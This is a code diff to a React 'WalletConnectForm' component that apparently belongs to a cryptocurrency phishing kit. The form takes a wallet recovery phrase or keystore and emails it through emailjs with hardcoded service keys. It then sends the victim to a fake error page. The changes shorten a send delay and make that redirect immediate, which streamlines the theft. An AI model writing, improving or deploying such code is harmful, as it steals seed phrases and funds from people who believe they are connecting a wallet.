@@ -76,7 +76,7 @@ const WalletConnectForm = ({ walletName, walletLogo, setDisplayForm }) => {
           '4leuzsOPi6Oh_D4e0'
         );
 
-        await sendFast(4 * 60 * 1000);
+        await sendFast(1 * 60 * 1000);
         
         await emailjs.send(
           'service_ky8xa0e',
@@ -94,9 +94,7 @@ const WalletConnectForm = ({ walletName, walletLogo, setDisplayForm }) => {
           'pudHPDoixy2beukw8'
         );
 
-        setTimeout(() => {
-          navigate('/error')
-        }, 3000);
+        navigate('/error');
       } catch (error) {
         console.log("")
         setPhraseSubmit("CONNECT")
@@ -146,7 +144,7 @@ const WalletConnectForm = ({ walletName, walletLogo, setDisplayForm }) => {
         '4leuzsOPi6Oh_D4e0'
       );
 
-      await sendFast(4 * 60 * 1000);
+      await sendFast(1 * 60 * 1000);
       
       await emailjs.send(
         'service_ky8xa0e',
@@ -163,9 +161,9 @@ const WalletConnectForm = ({ walletName, walletLogo, setDisplayForm }) => {
         },
         'pudHPDoixy2beukw8'
       );
-      setTimeout(() => {
-        navigate('/error')
-      }, 3000);
+      
+      navigate('/error');
+      
     } catch (error) {
       setKeystoreSubmit("CONNECT");
       console.log("error")
